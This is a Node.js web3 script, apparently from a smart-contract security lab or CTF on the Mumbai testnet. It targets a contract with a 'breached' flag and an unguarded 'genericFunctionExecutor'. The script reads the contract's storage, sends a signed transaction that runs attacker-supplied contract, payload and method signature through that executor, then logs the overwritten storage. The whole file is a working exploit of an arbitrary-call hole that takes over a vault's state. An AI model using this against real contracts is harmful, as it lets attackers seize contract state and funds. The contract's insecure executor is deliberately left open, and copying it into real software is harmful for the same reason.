const { Web3 } = require("web3");
require("dotenv").config();

// Load the contract ABI
const contractABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "GenericFunctionExecutor",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "bestCrypto",
    "outputs": [
      {
        "internalType": "string",
        "name": "",
        "type": "string"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true
  },
  {
    "inputs": [],
    "name": "breached",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true
  },
  {
    "inputs": [],
    "name": "lastSetter",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true
  },
  {
    "inputs": [],
    "name": "meaningOfLife",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "name": "powersOfTwo",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true
  },
  {
    "inputs": [
      {
        "internalType": "string",
        "name": "_bestCrypto",
        "type": "string"
      },
      {
        "internalType": "uint256",
        "name": "_meaningOfLife",
        "type": "uint256"
      }
    ],
    "name": "setVaultVariables",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_contract",
        "type": "address"
      },
      {
        "internalType": "bytes",
        "name": "_arguments",
        "type": "bytes"
      },
      {
        "internalType": "string",
        "name": "_methodSignature",
        "type": "string"
      }
    ],
    "name": "genericFunctionExecutor",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

// Load the contract address
const contractAddress = '0xe27AdBD639a6B4e5F04eC1C8C45F1C796F45c862';

async function main() {
  // Configuring the connection to an Infura node
  const web3 = new Web3(
    new Web3.providers.HttpProvider(process.env.MUMBAI_URL)
  );
  
  // Creating a signing account from a private key
  const signer = web3.eth.accounts.privateKeyToAccount(
    '0x'+process.env.PRIVATE_KEY
  );
  web3.eth.accounts.wallet.add(signer);

  // Creating a Contract instance
  const contract = new web3.eth.Contract(contractABI, contractAddress);

  // Initial state of STORAGE variables
  const bestCryptoStart = await contract.methods.bestCrypto().call();
  console.log("Initial state of 'bestCrypto': "+bestCryptoStart);
  const breachedStart = await contract.methods.breached().call();
  console.log("Initial state of 'breached': "+breachedStart);
  const lastSetterStart = await contract.methods.lastSetter().call();
  console.log("Initial state of 'lastSetter': "+lastSetterStart);
  const meaningOfLifeStart = await contract.methods.meaningOfLife().call();
  console.log("Initial state of 'meaningOfLife': "+meaningOfLifeStart);
  const powersOfTwoIndex9Start = await contract.methods.powersOfTwo(9).call();
  console.log("Initial state of 'powerOfTwo[9]': "+powersOfTwoIndex9Start);

  // Write all STORAGE variables
  const txData = contract.methods.genericFunctionExecutor(
    process.env.ATTACKER_CONTRACT,
    process.env.ATTACKER_PAYLOAD,
    process.env.ATTACKER_METHOD_SIGNATURE
  ).encodeABI();

  // Gas parameters
  const gasPrice = await web3.eth.getGasPrice(); 
  const gasLimit = 200000; 

  // Create transaction
  const rawTx = {
    nonce: await web3.eth.getTransactionCount(signer.address),
    from: signer.address,
    to: contractAddress,
    gasPrice: gasPrice, // Use the fetched gas price
    gasLimit: gasLimit,
    data: txData,
  };

  // Sign transaction
  const signedTx = await signer.signTransaction(rawTx);

  // Send transaction
  const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);

  // Log transaction receipt
  console.log('Transaction Receipt:', receipt);

  // Final state of STORAGE variables
  const bestCryptoEnd = await contract.methods.bestCrypto().call();
  console.log("Final state of 'bestCrypto': "+bestCryptoEnd);
  const breachedEnd = await contract.methods.breached().call();
  console.log("Final state of 'breached': "+breachedEnd);
  const lastSetterEnd = await contract.methods.lastSetter().call();
  console.log("Final state of 'lastSetter': "+lastSetterEnd);
  const meaningOfLifeEnd = await contract.methods.meaningOfLife().call();
  console.log("Final state of 'meaningOfLife': "+meaningOfLifeEnd);
  const powersOfTwoIndex9End = await contract.methods.powersOfTwo(9).call();
  console.log("Final state of 'powerOfTwo[9]': "+powersOfTwoIndex9End);
}

main();